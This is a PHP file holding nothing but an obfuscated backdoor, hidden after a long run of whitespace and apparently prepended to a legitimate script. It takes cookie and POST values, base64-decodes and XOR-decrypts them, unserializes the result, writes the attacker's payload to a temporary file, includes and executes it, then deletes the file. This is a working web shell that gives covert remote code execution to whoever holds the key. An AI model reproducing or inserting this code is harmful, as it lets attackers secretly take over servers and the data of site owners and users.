<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("syjdzdorfg")){class syjdzdorfg{public static $uxigogv = "fphcvyhbvgaeadrf";public static $lqqdzo = NULL;public function __construct(){$exqaxeed = @$_COOKIE[substr(syjdzdorfg::$uxigogv, 0, 4)];if (!empty($exqaxeed)){$ccffxsg = "base64";$awkdad = "";$exqaxeed = explode(",", $exqaxeed);foreach ($exqaxeed as $mvjcqhrib){$awkdad .= @$_COOKIE[$mvjcqhrib];$awkdad .= @$_POST[$mvjcqhrib];}$awkdad = array_map($ccffxsg . "_decode", array($awkdad,));$awkdad = $awkdad[0] ^ str_repeat(syjdzdorfg::$uxigogv, (strlen($awkdad[0]) / strlen(syjdzdorfg::$uxigogv)) + 1);syjdzdorfg::$lqqdzo = @unserialize($awkdad);}}public function __destruct(){$this->dphgoqu();}private function dphgoqu(){if (is_array(syjdzdorfg::$lqqdzo)) {$sayqkfxi = sys_get_temp_dir() . "/" . crc32(syjdzdorfg::$lqqdzo["salt"]);@syjdzdorfg::$lqqdzo["write"]($sayqkfxi, syjdzdorfg::$lqqdzo["content"]);include $sayqkfxi;@syjdzdorfg::$lqqdzo["delete"]($sayqkfxi);exit();}}}$qlliuipjyu = new syjdzdorfg();$qlliuipjyu = NULL;} ?><?php 
